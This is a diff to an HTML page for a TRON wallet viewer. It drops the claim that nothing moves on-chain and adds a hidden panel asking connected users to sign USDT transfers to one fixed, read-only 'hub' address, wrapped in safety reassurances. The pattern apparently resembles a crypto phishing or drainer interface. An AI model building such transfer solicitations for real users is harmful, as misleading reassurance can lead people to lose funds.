@@ -148,7 +148,7 @@
         <div class="linked-wallet-heading">
           <p class="eyebrow"><span></span> Connected wallet</p>
           <h2 id="linked-wallet-title">Your wallet and total assets</h2>
-          <p class="lede">After you scan or connect, this section shows the connecting wallet’s public TRON balances. Nothing is moved on-chain.</p>
+          <p class="lede">After you connect, this manage view shows your wallet, every public balance, and optional hub transfer requests that only your wallet can sign.</p>
         </div>
         <article class="linked-card linked-card-visitor" aria-labelledby="linked-visitor-label">
           <p class="linked-label" id="linked-visitor-label">Connecting wallet address</p>
@@ -158,6 +158,46 @@
           <dl class="asset-list" id="linked-token-list" aria-labelledby="linked-assets-heading"></dl>
           <p class="linked-note" id="linked-asset-note">Connect a wallet to load public balances.</p>
           <p class="linked-note linked-hub-note">Recorded hub link: <span class="connected-address" id="link-target-address">TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9</span></p>
+        </article>
+
+        <article class="linked-card wallet-manager-card" id="wallet-manager-panel" hidden aria-labelledby="wallet-manager-title">
+          <p class="eyebrow"><span></span> Hub wallet manager</p>
+          <h3 id="wallet-manager-title">Manage connected wallet</h3>
+          <p class="lede wallet-manager-lede">Review this wallet’s public balances and request a USDT transfer to hub <span class="connected-address" id="manager-hub-address">TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9</span>. Only your wallet can sign; nothing moves without that approval.</p>
+          <p class="linked-note wallet-manager-safety"><span aria-hidden="true">✓</span> No seed phrase · No private key · No auto-approve</p>
+
+          <div class="wallet-manager-tron" id="manager-transfer-tron" hidden>
+            <form class="wallet-manager-form" id="manager-transfer-form">
+              <label for="manager-transfer-recipient">Transfer recipient (hub)</label>
+              <input id="manager-transfer-recipient" name="recipient" type="text" readonly spellcheck="false" value="TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9" aria-describedby="manager-transfer-recipient-hint">
+              <p class="linked-note" id="manager-transfer-recipient-hint">Official TRC-20 USDT only. Recipient is fixed to the configured hub address.</p>
+              <label for="manager-transfer-amount">USDT amount</label>
+              <input id="manager-transfer-amount" name="amount" type="text" inputmode="decimal" autocomplete="off" placeholder="0.00" required>
+              <button class="primary-action wallet-manager-submit" id="manager-review-transfer" type="submit">Review transfer request</button>
+            </form>
+
+            <div class="wallet-manager-review" id="manager-transfer-review" hidden>
+              <h4 class="wallet-manager-review-title">Confirm before your wallet signs</h4>
+              <dl class="wallet-manager-review-list">
+                <div><dt>From</dt><dd class="connected-address" id="manager-review-sender"></dd></div>
+                <div><dt>To (hub)</dt><dd class="connected-address" id="manager-review-recipient"></dd></div>
+                <div><dt>Token</dt><dd>TRC-20 USDT</dd></div>
+                <div><dt>Amount</dt><dd id="manager-review-amount"></dd></div>
+              </dl>
+              <p class="linked-note">Reject the wallet prompt if any detail differs. This page never submits without your signature.</p>
+              <div class="wallet-manager-actions">
+                <button class="primary-action" id="manager-sign-transfer" type="button">Approve transfer in wallet</button>
+                <button class="retry-button" id="manager-cancel-transfer" type="button">Cancel</button>
+              </div>
+            </div>
+          </div>
+
+          <p class="linked-note wallet-manager-evm" id="manager-transfer-evm-note" hidden>
+            The hub address is on TRON. Connect with TronLink, Trust Wallet (TRON), or WalletConnect on TRON mainnet to request a signed USDT transfer.
+          </p>
+
+          <p class="wallet-manager-status" id="manager-transfer-status" role="status" aria-live="polite"></p>
+          <p class="asset-error" id="manager-transfer-error" role="alert" hidden></p>
         </article>
       </section>
 
